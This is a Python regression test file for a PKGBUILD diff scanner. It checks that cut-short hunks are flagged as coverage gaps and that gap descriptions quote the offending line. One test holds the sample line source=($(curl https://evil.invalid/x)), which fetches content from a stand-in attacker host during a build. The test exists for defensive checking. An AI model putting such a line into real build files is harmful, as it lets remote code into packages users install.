"""Regression tests for the Phase-2 coverage work on the typed core.

- ``partial_hunk``: a hunk carrying fewer lines than its header declares
  is a silent partial read.  The byte and line caps already fail closed
  with their own gaps; this covers the cut that reports nothing (a
  hand-sliced fixture, a stored blob capped upstream), which every array
  reader downstream used to treat as a whole array.
- Precise gap text: an unresolved-source gap quotes the first offending
  assignment instead of naming only the category.
"""

from trustsight.analysis.pipeline import scan_diff
from trustsight.coverage import PARTIAL_HUNK, describe, gaps_from
from trustsight.diffdoc import parse_diff_lines
from trustsight.tokenizer import split_lines


_CUT = """\
--- PKGBUILD
+++ PKGBUILD
@@ -1,6 +1,6 @@
 pkgname=demo
-pkgver=1.0
+pkgver=1.1
 depends=(
"""

_INTACT = """\
--- PKGBUILD
+++ PKGBUILD
@@ -1,3 +1,3 @@
 pkgname=demo
-pkgver=1.0
+pkgver=1.1
 pkgrel=1
"""


def _cuts(diff_text):
    return len(parse_diff_lines(split_lines(diff_text)).cut_hunks())


def test_a_cut_hunk_is_a_coverage_gap():
    assert _cuts(_CUT) == 1
    gaps = gaps_from(partial_hunks=_cuts(_CUT))
    assert gaps == [PARTIAL_HUNK]
    assert "cut mid-hunk" in describe(gaps)


def test_the_byte_and_line_caps_own_their_own_gap():
    # When a declared bound did the cutting, its gap already fails closed;
    # partial_hunk would only repeat it.
    assert gaps_from(diff_truncated=True, partial_hunks=1) == ["diff_truncated"]
    assert gaps_from(scan_truncated=True, partial_hunks=1) == ["scan_truncated"]


def test_an_intact_diff_has_no_partial_hunk():
    assert _cuts(_INTACT) == 0
    assert PARTIAL_HUNK not in gaps_from(partial_hunks=0)


def test_scan_diff_fails_closed_on_a_silently_cut_diff():
    fact = scan_diff(_CUT, package_name="demo")
    assert PARTIAL_HUNK in fact.coverage_gaps


def test_an_unresolved_source_gap_quotes_the_offending_assignment():
    text = describe(
        ["unresolved_source"],
        details={"unresolved_source": ["source=($(curl https://evil.invalid/x))"]},
    )
    assert "source=($(curl https://evil.invalid/x))" in text


def test_gap_text_is_unchanged_without_details():
    assert describe(["unresolved_source"]) == describe(
        ["unresolved_source"], details={}
    )
